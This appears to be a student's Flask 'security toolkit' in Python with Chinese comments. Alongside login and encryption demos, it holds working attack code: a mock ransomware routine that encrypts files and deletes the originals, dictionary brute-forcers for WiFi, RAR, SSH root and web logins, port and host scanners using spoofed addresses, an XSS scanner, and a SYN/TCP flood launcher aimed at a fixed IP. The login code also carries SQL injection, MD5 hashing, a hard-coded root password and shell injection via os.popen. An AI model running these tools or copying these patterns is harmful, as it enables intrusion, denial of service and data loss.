from flask import Flask, render_template,request,redirect
import socket, random, time, os, threading
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import IP, TCP, ICMP
from scapy.layers.l2 import Ether, getmacbyip, ARP
from scapy.sendrecv import send, sendp
import pywifi
from pywifi import const
import time
import datetime
from flask import Flask, render_template, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import requests         #pip install requests
import re
from time import sleep
import os
import pymysql
import hashlib
import json
from Crypto.Cipher import DES,AES
import binascii
import base64
from hashlib import md5
import rsa
from binascii import b2a_hex, a2b_hex

app = Flask(__name__)
port_list = []
#=================================登录功能===============================================
# 将所有对主页面的访问都跳转到登录框
@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('/log_in.html')
# 处理普通用户登陆
@app.route('/log_handle', methods=['POST'])
def log_handle():
    find_user = False
    if request.method == 'POST':
        # username和password是前端log_in.html的name字段里的字符
        username = request.form.get('username')
        password = request.form.get('password')
        # 对密码进行md5处理
        encrypass = hashlib.md5()
        encrypass.update(password.encode(encoding='utf-8'))
        password = encrypass.hexdigest()

    # 通过mysql进行存储
    db = pymysql.connect(host="localhost", user="root", password="123456", db="www")
    # 创建数据库指针cursor
    cursor = db.cursor()
    sql = "SELECT * FROM users"
    # 执行数据库命令并将数据提取到cursor中
    cursor.execute(sql)
    # 确认命令
    db.commit()
    user_list = []
    for item in cursor.fetchall():
        dict_user = {'username': item[0], 'password': item[1]}
        user_list.append(dict_user)
    # 对数据库中所有的数据进行遍历,找出username
    for i in range(len(user_list)):
        if user_list[i]['username'] == username:
            if user_list[i]['password'] == password:
                find_user = True
                break
            else:
                break
    db.close()
    if not find_user:
        # 登录失败就跳转倒log_fail中并弹窗
        return render_template("log_fail.html")
    else:
        # 登录成功就跳转log_success(用户界面)
        return render_template('/home.html')
# 处理注册
@app.route('/register_handle', methods=['POST'])
def register_handle():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        confirm_password = request.form.get('confirm_password')
        # 判断两次密码是否正确
        if password == confirm_password:
            # 对密码进行md5处理
            encrypass = hashlib.md5()
            encrypass.update(password.encode(encoding='utf-8'))
            password = encrypass.hexdigest()
            db = pymysql.connect(host="localhost", user="root", password="123456", db="www")
            cursor = db.cursor()
            search_sql = "SELECT * FROM users"
            cursor.execute(search_sql)
            db.commit()
            if cursor.fetchall() is None:
                user_list = []
                for item in cursor.fetchall():
                    dict_user = {'username': item[0], 'password': item[1]}
                    user_list.append(dict_user)
                for i in range(len(user_list)):
                    # 判断是否存在相同用户名
                    if user_list[i]['username'] != username:
                        # 将用户名和加密后的密码插入数据库
                        sql = "INSERT INTO users VALUES('%s','%s')" % (username, password)
                        cursor.execute(sql)
                        db.commit()
                    else:
                        have_same_username = 1
                        return render_template("register_fail.html", have_same_username=have_same_username)
            else:
                sql = "INSERT INTO users VALUES('%s','%s')" % (username, password)
                cursor.execute(sql)
                db.commit()
        else:
            two_passwd_wrong = 1
            return render_template("register_fail.html", two_passwd_wrong=two_passwd_wrong)
    db.close()
    return render_template('log_in.html')

@app.route('/log_in', methods=['GET'])
def log_in():
    return render_template('/log_in.html')

@app.route('/register', methods=['GET'])
def register():
    return render_template('/register.html')

#========================系统主页==========================================================
@app.route('/home',methods=['GET'])
def home():
    return render_template('/home.html')

#========================加密模块==========================================================

# AES 加密函数
def AES_encrypt(plaintext, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
    return base64.b64encode(cipher.iv + ciphertext).decode('utf-8')
# AES 解密函数
def AES_decrypt(ciphertext, key):
    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    plaintext = unpad(cipher.decrypt(ciphertext[AES.block_size:]), AES.block_size)
    return plaintext.decode('utf-8')
@app.route('/aes')
def aes():
    return render_template('aes.html', encrypt_result='', decrypt_result='')

@app.route('/aes_encrypt', methods=['POST'])
def aes_encrypt():
    plaintext = request.form.get('plaintext')
    key = request.form.get('key')

    # AES 密钥必须是 16（AES128）, 24（AES192）, 或 32（AES256）字节长
    if len(key) not in [16, 24, 32]:
        return render_template('aes.html', encrypt_result='Invalid key length. It must be 16, 24, or 32 bytes.',
                               decrypt_result='')
    try:
        ciphertext = AES_encrypt(plaintext, key.encode('utf-8'))
        return render_template('aes.html', encrypt_result=f'{ciphertext}', decrypt_result='')
    except Exception as e:
        return render_template('aes.html', encrypt_result=str(e), decrypt_result='')

@app.route('/aes_decrypt', methods=['POST'])
def aes_decrypt():
    ciphertext = request.form.get('ciphertext')
    key = request.form.get('key')

    # AES 密钥必须是 16（AES128）, 24（AES192）, 或 32（AES256）字节长
    if len(key) not in [16, 24, 32]:
        return render_template('aes.html', encrypt_result='',
                               decrypt_result='Invalid key length. It must be 16, 24, or 32 bytes.')

    try:
        plaintext = AES_decrypt(ciphertext, key.encode('utf-8'))
        return render_template('aes.html', encrypt_result='', decrypt_result=f'{plaintext}')
    except Exception as e:
        return render_template('aes.html', encrypt_result='', decrypt_result=str(e))

# RSA加密
pub, priv = rsa.newkeys(2048)

def EnCrypt_RSA(plain_text):
    global pub
    encrypt = rsa.encrypt(plain_text.encode(), pub)
    encstr = b2a_hex(encrypt).decode()
    return encstr

def DeCrypt_RSA(cipher_text):
    global priv
    decrypt = rsa.decrypt(a2b_hex(cipher_text), priv)
    return decrypt

@app.route('/myrsa')
def myrsa():
    return render_template('myrsa.html', encrypt_result='', decrypt_result='')

@app.route('/rsa_encrypt', methods=['POST'])
def rsa_encrypt():
    plaintext = request.form.get('plaintext')
    ciphertext = EnCrypt_RSA(plaintext)
    return render_template('myrsa.html', encrypt_result=f'{ciphertext}', decrypt_result='')

@app.route('/rsa_decrypt', methods=['POST'])
def rsa_decrypt():
    ciphertext = request.form.get('ciphertext')
    plaintext = DeCrypt_RSA(ciphertext)
    return render_template('myrsa.html', encrypt_result='', decrypt_result=f'{plaintext}')

# Base64编码
@app.route('/mybase64')
def mybase64():
    return render_template('mybase64.html', encrypt_result='', decrypt_result='')

@app.route('/base64_encrypt', methods=['POST'])
def base64_encrypt():
    plaintext = request.form.get('plaintext')
    ciphertext = base64.b64encode(plaintext.encode('utf-8'))
    ciphertext = ciphertext.decode('utf-8')
    return render_template('mybase64.html', encrypt_result=f'{ciphertext}', decrypt_result='')

@app.route('/base64_decrypt', methods=['POST'])
def base64_decrypt():
    ciphertext = request.form.get('ciphertext')
    plaintext = base64.b64decode(ciphertext.encode('utf-8'))
    plaintext = plaintext.decode('utf-8')
    return render_template('mybase64.html', encrypt_result='', decrypt_result=f'{plaintext}')

# MD5算法
@app.route('/mymd5')
def mymd5():
    return render_template('mymd5.html', encrypt_result='', decrypt_result='')

@app.route('/md5_encrypt', methods=['POST'])
def md5_encrypt():
    plaintext = request.form.get('plaintext')
    new_md5 = md5()
    new_md5.update(plaintext.encode(encoding='utf-8'))
    return render_template('mymd5.html', encrypt_result=f'{new_md5.hexdigest()}')

# 模拟勒索病毒（文件加密）
def LS_encrypt(filepath):
    with open(filepath, mode='rb') as file:
        data = file.read()
    source = base64.b64encode(data).decode()
    dest = ''
    for c in source:
        dest += chr(ord(c)+5)
    # 将加密字符串保存到文件中
    with open(filepath + '.enc', mode='w') as file:
        file.write(dest)
    # 删除原始文件
    os.remove(filepath)
# 解密
def LS_decrypt(filepath):
    with open(filepath, mode='r') as file:
        content = file.read()
    dest = ''
    for c in content:
        dest += chr(ord(c)-5)
    newfile = filepath.replace('.enc', '')
    with open(newfile, mode='wb') as file:
        file.write(base64.b64decode(dest))
    # 删除加密文件
    os.remove(filepath)
@app.route('/lesuo')
def lesuo():
    return render_template('lesuo.html', encrypt_result='', decrypt_result='')

@app.route('/lesuo_encrypt', methods=['POST'])
def lesuo_encrypt():
    filepath = request.form.get('plaintext')
    LS_encrypt(filepath)
    return render_template('lesuo.html', status='已加密')

@app.route('/lesuo_decrypt', methods=['POST'])
def lesuo_decrypt():
    filepath = request.form.get('ciphertext')
    LS_decrypt(filepath)
    return render_template('lesuo.html', status='已解密')

#========================爆破模块==========================================================
#WiFi爆破
# 测试连接，返回链接结果
def wifiConnect(pwd,target):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = target
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
    ##### 调用传入的密码pwd
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(1)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")
# 读取密码本
def readPassword(target):
    # 密码本路径
    path = "D:\Softwares\PyCharm2022\MyProjects\AFinal\opt\dict\pwds.txt"
    # 打开文件
    file = open(path, "r")
    while True:
        try:
            # 一行一行读取
            pad = file.readline()
            bool = wifiConnect(pad,target)     #调用定义的wifiConnect()函数
            if bool:
                return pad
        except:
            continue
@app.route('/bomb_wifi')
def bomb_wifi():
    return render_template('bomb_wifi.html', result='')
@app.route('/bomb_wifi_do', methods=['POST'])
def bomb_wifi_do():
    target = request.form.get('target')
    start = datetime.datetime.now()
    pwd = readPassword(target)
    end = datetime.datetime.now()
    return render_template('bomb_wifi.html', result=f'{target}网络成功连接，WiFi密码为：{pwd}爆破时间：{end - start}')

#rar压缩文件爆破
import rarfile      #该py文件目录里必须含有UnRAR.exe
import zipfile
import threading
# 判断线程是否需要终止
flag = True
rarpwd = ''
def extract(password, file):
    global rarpwd
    try:
        password = str(password)
        # file.extractall(pwd=password.encode('utf-8'))  # zip解压缩
        file.extractall(pwd=password)   #rar解压缩
        global flag
        flag = False
        rarpwd = password   #同样设置一个全局变量记录密码，跟随系统暂停flag
    except Exception:
        pass  # 密码错误则跳过

def RAR_Bomb(targetfile):
    #file = zipfile.ZipFile("test.zip")  # 压缩文件
    file = rarfile.RarFile(targetfile)
    passwords = open('D:\Softwares\PyCharm2022\MyProjects\AFinal\opt\dict\pwds.txt')  # 密码字典
    for line in passwords.readlines():  # 逐行读取密码
        if flag is True:
            password = line.strip('\n')  # 去掉回车
            # print(line, end="")  # 逐个查看当前密码
            t = threading.Thread(target=extract, args=(password, file))
            t.start()  # 开始
            t.join()  # Parent父线程会等待child子线程运行完再继续运行
@app.route('/bomb_rar')
def bomb_rar():
    return render_template('bomb_rar.html', result='')
@app.route('/bomb_rar_do', methods=['POST'])
def bomb_rar_do():
    global flag
    target = request.form.get('target')
    RAR_Bomb(target)
    flag = True         #设置全局变量flag为True，可以继续执行程序
    return render_template('bomb_rar.html', result=f'压缩文件密码为：{rarpwd}')

#SSH爆破
import paramiko
import time
# 爆破SSH，建议使用证书进行登录
def ssh_crack(targethost):
    with open('D:\Softwares\PyCharm2022\MyProjects\AFinal\opt\dict\pwds.txt') as file:
        pw_list = file.readlines()
    for password in pw_list:
        try:
            transport = paramiko.Transport((targethost, 22))
            transport.connect(username='root', password=password.strip())
            # print(f"SSH破解成功，密码为：{password.strip()}")
            break
        except:
            pass
        time.sleep(1)
    return password.strip()
@app.route('/bomb_ssh')
def bomb_ssh():
    return render_template('bomb_ssh.html', result='')
@app.route('/bomb_ssh_do', methods=['POST'])
def bomb_ssh_do():
    target = request.form.get('target')
    ssh_pwd = ssh_crack(target)
    return render_template('bomb_ssh.html', result=f'SSH登录密码为：{ssh_pwd}')

# Web账号密码爆破
webpwd = ''
webusr = ''
webflag = True
def ws_thread_10(sublist,targetweb):
    global webflag
    global webusr
    global webpwd
    with open('D:\\Softwares\\PyCharm2022\\MyProjects\\AFinal\\opt\\dict\\password-top6000.txt') as file:
        pw_list = file.readlines()

    url = targetweb
    session = requests.session()

    for username in sublist:
        for password in pw_list:
            data = {'username': username.strip(), 'password': password.strip(), 'verifycode':'0000'}
            resp = session.post(url=url, data=data)
            if 'login-fail' not in resp.text:
                # print(f'疑似破解成功, 账号为：{username.strip()}，密码为：{password.strip()}')
                webflag = False
                webusr = username.strip()
                webpwd = password.strip()
                return

def WEB_Bomb(targetweb):
    with open('D:\\Softwares\\PyCharm2022\\MyProjects\\AFinal\\opt\\dict\\username-top500.txt') as file:
        user_list = file.readlines()

    for i in range(0, len(user_list), 10):
        if webflag is True:
            sublist = user_list[i:i + 10]
            ws_thread_10(sublist,targetweb)
            # t = threading.Thread(target=ws_thread_10, args=(sublist,targetweb))
            # t.start()
            # t.join()

@app.route('/bomb_web')
def bomb_web():
    return render_template('bomb_web.html', result='')
@app.route('/bomb_web_do', methods=['POST'])
def bomb_web_do():
    global webflag
    target = request.form.get('target')
    WEB_Bomb(target)
    webflag = True
    return render_template('bomb_web.html', result=f'爆破出一组账号密码，账号：{webusr}，密码：{webpwd}')


#========================扫描模块==========================================================
# 基于Socket的端口扫描
open_ports = []
def socket_port_thread(ip, start):
    global open_ports
    for port in range(start, start+100):
        try:
            s = socket.socket()
            s.settimeout(0.1)       # 设置无法连接情况下超时时间，提升扫描效率
            s.connect((ip, port))
            open_ports.append(port)
            s.close()
        except:
            pass
@app.route('/pscan_socket')
def pscan_socket():
    return render_template('pscan_socket.html', result='')
@app.route('/pscan_socket_do', methods=['POST'])
def pscan_socket_do():
    global open_ports
    target = request.form.get('target')
    for i in range(1, 65536, 100):  # 650多个线程每个扫100个端口
        threading.Thread(target=socket_port_thread, args=(target, i)).start()
    time.sleep(10)
    ports = str(open_ports)
    open_ports = []
    return render_template('pscan_socket.html', result=f'目标开放的端口：{ports}')
# 基于Scapy的端口扫描
from scapy.layers.inet import IP, TCP
from scapy.all import *
scapy_ports = []
def Scapy_port(ip):
    global scapy_ports
    # 通过指定源IP地址，可以实现IP欺骗，进而导致半连接，此类操作也可以用于Flags参数定义上
    # pkg = IP(src='192.168.115.123', dst=ip)/TCP(dport=80, flags='SA')
    list = [7, 21, 22, 23, 25, 43, 53, 67, 68, 69, 79, 80, 81, 88, 109, 110, 113, 119, 123, 135, 135,
            137, 138, 139, 143, 161, 162, 179, 194, 220, 389, 443, 445, 465, 513, 520, 520, 546, 547,
            554, 563, 631, 636, 991, 993, 995, 1080, 1194, 1433, 1434, 1494, 1521, 1701, 1723, 1755,
            1812, 1813, 1863, 3269, 3306, 3307, 3389, 3544, 4369, 5060, 5061, 5355, 5432, 5671, 5672, 6379,
            7001, 8080, 8081, 8088, 8443, 8883, 8888, 9443, 9988, 9988, 15672, 50389, 50636, 61613, 61614]
    for port in list:
        try:
            pkg = IP(src='192.168.19.1', dst=ip) / TCP(dport=port, flags='S')
            reply = sr1(pkg, timeout=1, verbose=False)
            # print(reply[TCP].flags)
            if reply[TCP].flags == 0x12:
                scapy_ports.append(port)
        except:
            pass
@app.route('/pscan_scapy')
def pscan_scapy():
    return render_template('pscan_scapy.html', result='')
@app.route('/pscan_scapy_do', methods=['POST'])
def pscan_scapy_do():
    global scapy_ports
    target = request.form.get('target')
    Scapy_port(target)
    ports = str(scapy_ports)
    scapy_ports = []
    return render_template('pscan_scapy.html', result=f'目标开放的端口：{ports}')

#基于Ping命令的IP扫描
iplist_ping = []
def ping_ip(start,target):
    global iplist_ping
    for i in range(start,start+10):
        ip = f'{target}.{i}'
        output = os.popen(f'ping -n 1 -w 100 {ip}').read()
        if 'TTL=' in output:
            iplist_ping.append(ip)

@app.route('/ipscan_ping')
def ipscan_ping():
    return render_template('ipscan_ping.html', result='')
@app.route('/ipscan_ping_do', methods=['POST'])
def ipscan_ping_do():
    global iplist_ping
    target = request.form.get('target')
    for i in range(1, 255, 10):
        threading.Thread(target=ping_ip, args=(i,target)).start()  # 基于ping命令
        # threading.Thread(target=scapy_ip, args=(i,)).start()      # 基于scapy发包

    time.sleep(5)       #一定要注意睡的时间！
    iplist = str(iplist_ping)
    iplist_ping = []
    return render_template('ipscan_ping.html', result=f'目标网段存活IP：{iplist}')
# 基于scapy的IP扫描
iplist_scapy = []
def scapy_ip(start,target):
    global iplist_scapy
    for i in range(start, start+10):
        ip = f'{target}.{i}'
        try:
            pkg = ARP(psrc='192.168.19.1', pdst=ip)
            reply = sr1(pkg, timeout=3, verbose=False)
            print(reply[ARP].hwsrc)
            iplist_scapy.append(ip)
        except :
            pass

@app.route('/ipscan_scapy')
def ipscan_scapy():
    return render_template('ipscan_scapy.html', result='')
@app.route('/ipscan_scapy_do', methods=['POST'])
def ipscan_scapy_do():
    global iplist_scapy
    target = request.form.get('target')
    for i in range(1, 255, 10):
        threading.Thread(target=scapy_ip, args=(i,target)).start()      # 基于scapy发包

    time.sleep(30)  # 一定要注意睡的时间！
    iplist = str(iplist_scapy)
    iplist_scapy = []
    return render_template('ipscan_scapy.html', result=f'目标网段存活的IP：{iplist}')

# 基于Ping命令的子域名扫描
domlist_ping = []
def ping_domain(target):
    global domlist_ping
    with open('D:\\Softwares\\PyCharm2022\\MyProjects\\AFinal\\opt\\dict\\subdomain-top100.txt') as file:
        domain_list = file.readlines()

    for domain in domain_list:
        result = os.popen(f"ping -n 1 -w 1000 {domain.strip()}.{target}").read()
        if '找不到主机' not in result:
            domain = domain.strip() +'.' + target
            domlist_ping.append(domain)
            # print(f"{domain.strip()}.woniuxy.com")
@app.route('/domscan_ping')
def domscan_ping():
    return render_template('domscan_ping.html', result='')
@app.route('/domscan_ping_do', methods=['POST'])
def domscan_ping_do():
    global domlist_ping
    target = request.form.get('target')
    ping_domain(target)

    time.sleep(10)  # 一定要注意睡的时间！
    domlist = str(domlist_ping)
    domlist_ping = []
    return render_template('domscan_ping.html', result=f'子域名搜集：{domlist}')

# 基于socket的子域名搜集
domlist_socket = []
def socket_domain(target):
    global domlist_socket
    with open('D:\\Softwares\\PyCharm2022\\MyProjects\\AFinal\\opt\\dict\\subdomain-top100.txt') as file:
        domain_list = file.readlines()

    for domain in domain_list:
        try:
            ip = socket.gethostbyname(f'{domain.strip()}.{target}')
            domain = domain.strip() + '.' + target
            domlist_socket.append(domain)
            # print(f'{domain.strip()}.nuist.edu.cn')
        except socket.gaierror:
            pass
@app.route('/domscan_socket')
def domscan_socket():
    return render_template('domscan_socket.html', result='')
@app.route('/domscan_socket_do', methods=['POST'])
def domscan_socket_do():
    global domlist_socket
    target = request.form.get('target')
    socket_domain(target)

    time.sleep(10)  # 一定要注意睡的时间！
    domlist = str(domlist_socket)
    domlist_socket = []
    return render_template('domscan_socket.html', result=f'子域名搜集：{domlist}')
# Web站点信息搜集
from whois import whois
import json
def whois_info(target):
    result = whois(target)
    dict = json.loads(str(result))
    return dict
@app.route('/webinfo')
def webinfo():
    return render_template('webinfo.html', result='')
@app.route('/webinfo_do', methods=['POST'])
def webinfo_do():
    target = request.form.get('target')
    info = whois_info(target)
    return render_template('webinfo.html', result=f'目标站点的Whois信息：{info}')

# xss扫描
def str_html(source):
    result = ''
    for c in source:
        result += "&#x" + hex(ord(c)) + ";"
    return result.replace('0x', '')
# 判断响应的构成
def check_resp(response, payload, type):
    index = response.find(payload)
    prefix = response[index-2:index-1]
    if type == 'Normal' and prefix != '=' and index >= 0:
        return True
    elif type == 'Prop' and prefix == '=' and index >= 0:
        return True
    elif type == 'Escape':
        index = response.find(str_html(payload))
        prefix = response[index-2:index-1]
        if prefix == '=' and str_html(payload) in response:
            return True
    elif index >= 0:
        return True

    return False

# 基于GET请求实现XSS扫描
Payload_list = []
def Xss_scan(location):
    global Payload_list
    url = location.split('?')[0]
    param_list = location.split('?')[1].split('&')
    with open('D:\\Softwares\\PyCharm2022\\MyProjects\\AFinal\\opt\\dict\\xss-payload.txt') as file:
        payload_list = file.readlines()

    for payload in payload_list:
        type = payload.strip().split(':', 1)[0]
        payload = payload.strip().split(':', 1)[1]
        if type == 'Referer' or type == 'User-Agent' or type == 'Cookie':
            header = {type: payload}
            resp = requests.get(url=url, headers=header)
        elif type == 'Escape':
            params = {}
            for param in param_list:
                key = param.split("=")[0]
                params[key] = str_html(payload)
            resp = requests.get(url=url, params=params)
        else:
            params = {}
            for param in param_list:
                key = param.split("=")[0]
                params[key] = payload
            resp = requests.get(url=url, params=params)

        if check_resp(resp.text, payload, type):
            # print(f"存在XSS漏洞：Payload为：{payload}" )
            Payload_list.append(payload)
@app.route('/xss_scan')
def xss_scan():
    return render_template('xss_scan.html', result='')
@app.route('/xss_scan_do', methods=['POST'])
def xss_scan_do():
    global Payload_list
    target = request.form.get('target')
    Xss_scan(target)
    result = Payload_list
    Payload_list = []
    return render_template('xss_scan.html', result=f'可利用的Payload：{result}')


# ========================爬虫模块=======================================================
# 图片爬虫
@app.route('/spider_skin',methods=['GET','POST'])
def spider_skin():
    return render_template('/spider_skin.html')
@app.route('/spider_skin_do',methods=['GET','POST'])
def spider_skin_do():
    all_hero_url = 'https://lol.qq.com/biz/hero/champion.js'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'}

    all_hero_js_resp = requests.get(all_hero_url, headers=headers)

    all_hero_name = re.findall(r'"\d+?":"(\w+?)"', all_hero_js_resp.text)

    for n in all_hero_name:
        sleep(1)  # 让系统休眠1秒，避免被检测出来是爬虫被屏蔽IP
        hero_info_js_url = f"https://lol.qq.com/biz/hero/{n}.js"  # f作用是让{}起到占位符的效果，不然{n}被认为是字符串
        hero_info_js_resp = requests.get(hero_info_js_url, headers=headers)
        hero_info_js = hero_info_js_resp.text
        # 正则表达式匹配皮肤id
        skin_ids = re.findall(r'"id":"(\d+?)"', hero_info_js)
        # 正则表达式匹配皮肤名称
        skin_names = re.findall(r'"name":"(.+?)".+?"chrom', hero_info_js)  # .是指所有的非空字符

        for id, name in zip(skin_ids, skin_names):
            img_url = f'https://game.gtimg.cn/images/lol/act/img/skin/big{id}.jpg'
            # 发送请求
            img_resp = requests.get(img_url, headers=headers)

            name = name.encode().decode('unicode_escape')

            name = name.replace('/', '')
            name = name.replace('\\', '')
            print(f'正在爬取{n}的{name}皮肤')

            if not os.path.exists(f'./img/{n}'):
                os.makedirs(f'./img/{n}')
            with open(f'./img/{n}/{name}.jpg', 'wb') as f:
                f.write(img_resp.content)
                sleep(1)
    return render_template('spider_skin_result.html')


# 文字爬虫
import requests
from lxml import etree
import xlwt
headers={
"User-Agent": "xxxx"
}
data_total=[]
def get_dangdang_info(i,url):
    html=requests.get(url,headers=headers)
    html.encoding = html.apparent_encoding  # 将乱码进行编码
    selector=etree.HTML(html.text)
    datas=selector.xpath('//div[@class="bang_list_box"]')

    for data in datas:

        Ranks = data.xpath('ul/li/div[1]/text()')
        names = data.xpath('ul/li/div[3]/a/text()')
        pingluns = data.xpath('ul/li/div[4]/a/text()')
        authors = data.xpath('ul/li/div[5]/a/text()')
        chubans = data.xpath('ul/li/div[6]/span/text()')
        jiages = data.xpath('ul/li/div[7]/p[1]/span[1]/text()')
        yuanjias = data.xpath('ul/li/div[7]/p[1]/span[2]/text()')
        discounts = data.xpath('ul/li/div[7]/p[1]/span[3]/text()')
 # urls = data.xpath('ul/li/div[3]/a/@href')
    for Rank,name,pinglun,author,chuban,jiage,yuanjia,discount in zip(Ranks,names,pingluns,authors,chubans,jiages,yuanjias,discounts):
            print(Rank,name,pinglun,author,chuban,jiage,yuanjia,discount)
            dflist = []
            dflist.append(i)
            dflist.append(Rank)
            dflist.append(name)
            dflist.append(pinglun)
            dflist.append(author)
            dflist.append(chuban)
            dflist.append(jiage)
            dflist.append(yuanjia)
            dflist.append(discount)
            data_total.append(dflist)


def list_save():
    head = ['year','Rank','name', 'pinglun','author','chuban','jiage','yuanjia','discount']  # 定义表头
    book = xlwt.Workbook(encoding='utf-8')  # 创建工作簿
    sheet_name = book.add_sheet('当当网畅销榜TOP500书籍信息')  # 创建工作表
 # 写入表头数据
    for h in range(len(head)):
        sheet_name.write(0, h, head[h])
    row = 1
    data_len = len(data_total)
    for i in range(data_len):
        for j in range(len(head)):
            sheet_name.write(row, j, data_total[i][j])
        row += 1
        book.save('当当网畅销榜TOP500书籍信息.xls')
@app.route('/spider_book')
def spider_book():
    return render_template('spider_book.html')
@app.route('/spider_book_do', methods=['POST'])
def spider_book_do():
    for i in range(2020, 2024):
        for j in range(1, 26):
            url = 'http://bang.dangdang.com/books/bestsellers/01.00.00.00.00.00-year-{i}-0-1-{j}'.format(i=i, j=j)
            get_dangdang_info(i, url)
    print("正在保存到Excel，请稍候...")
    list_save()
    print("程序运行结束")
    return render_template('spider_book.html',result='已结束')

# 超链接爬虫
def download_page():
    resp = requests.get('https://ke.huayunsys.com/')
    links = re.findall('<a href="(.+?)"', resp.text)
    for link in links:
        # 先根据页面特性，将一些无用的超链接进行排除
        if link.startswith('#'):
            continue
        if '?' in link:
            link = str(link).replace("?","")
        # 对超链接进行处理，拼接出完整的URL地址
        if link.startswith('/'):
            link = 'https://ke.huayunsys.com' + link

        # 将页面文件保存于本地
        try:
            resp = requests.get(link)
            resp.encoding = 'utf-8'
            filename = link.split('/')[-1] + time.strftime("_%Y%m%d_%H%M%S") + '.html'
            with open(f'./page/{filename}', mode='w', encoding='utf-8') as file:
                file.write(resp.text)
        except:
            pass
@app.route('/spider_link')
def spider_link():
    return render_template('spider_link.html')
@app.route('/spider_link_do', methods=['POST'])
def spider_link_do():
    download_page()
    return render_template('spider_link.html',result='已结束')


#========================泛洪攻击模块=======================================================
# TCP三次握手泛洪
def socket_flood():
    while True:
        s = socket.socket()
        s.connect(('192.168.19.132', 3306))
# scapy半连接
def scapy_flood():
    while True:
        sport = random.randint(10000, 30000)
        pkg = IP(dst='192.168.19.132')/TCP(sport=sport, dport=3306, flags='S')
        send(pkg, verbose=False)

@app.route('/flood_mix',methods=['GET','POST'])
def flood_mix():
    return render_template('/flood_mix.html')
@app.route('/flood_mix_do',methods=['GET','POST'])
def flood_mix_do():
    for i in range(50000):
        threading.Thread(target=socket_flood).start()
        threading.Thread(target=scapy_flood).start()

# ========================DOS检测防御模块=======================================================
@app.route('/dos',methods=['GET','POST'])
def dos():
    return render_template('/dos.html')

if __name__ == '__main__':
    app.run(debug=True)